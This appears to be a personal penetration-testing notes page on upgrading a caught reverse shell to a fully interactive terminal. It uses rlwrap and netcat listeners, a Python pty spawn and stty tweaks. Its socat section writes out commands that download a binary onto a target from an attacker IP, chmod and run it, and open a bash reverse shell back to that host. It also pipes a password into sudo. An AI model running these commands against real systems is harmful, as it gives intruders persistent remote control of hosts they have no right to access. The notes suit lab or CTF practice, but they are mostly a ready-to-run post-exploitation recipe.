Related Articles: [[Shells]]
Tags: #Maneuvers

---

# ðŸ“š Definition:
Upgrading the shell to a fully interactive one let's us gain a more stable and more functional shell on the target host resulting in easier execution of commands, view, navigation and a more reliable session.

There are several methods and tools to accomplish this.

---
## Method 1:
Using **rlwrap** and **ncat**:
	First we will have to set up a listener: 
```bash
rlwrap nc -lvnp 4444
```

Once we got the connection back to our listener. On the target host we have to:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This command is basically using python's PTY library (pseudo-terminal) to call the spawn() function and spawn a bash shell.

---

Then we have to **CTRL+Z** to background the shell.
```bash
stty raw -echo
```
This command will stop echoing on the local shell and it will turn it to raw mode which will allow for more direct communication.

```bash
stty size
```
This command will show the current size of the terminal, this will help us correlating the size of the target terminal with ours. 

---

Then we have to foreground the shell by typing fg in the terminal:
```bash
fg
```
This will bring back the shell.

---

Now in the target host's shell we have to:

```bash
export SHELL=bash
```
This will make sure that the shell used is bash.

```bash
stty rows $x columns $y
```
As said earlier, this will let us correlate the sizes of our shells so that the font is readable and cool.

```bash
export TERM=xterm-256color
```
This is will set the TERM variable which declares the terminal type. 256color is the color.


---
##### Method 2:
Using **socat**:
socat TCP4-LISTEN:443 STDOUT # to receive a connection

socat TCP4:IpAddress:port(443) EXEC:/bin/bash # to execute a bash shell in the another machine

then in attacker machines use wget <LOCAL-IP>:port of web_server/name_of_file-O /path of file to doenload it /new_name â€”- 
wget 10.10.16.22 :4444/socat -O /tmp/socat â€”>(command execute in target )

./socat TCP4:10.10.16.22:4445 EXEC:/bin/bash

python3 -c 'import pty;pty.spawn("/bin/bash")'

echo "your_password" | sudo -S -i

wget -q http://10.10.16.9:9090/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.9:4445

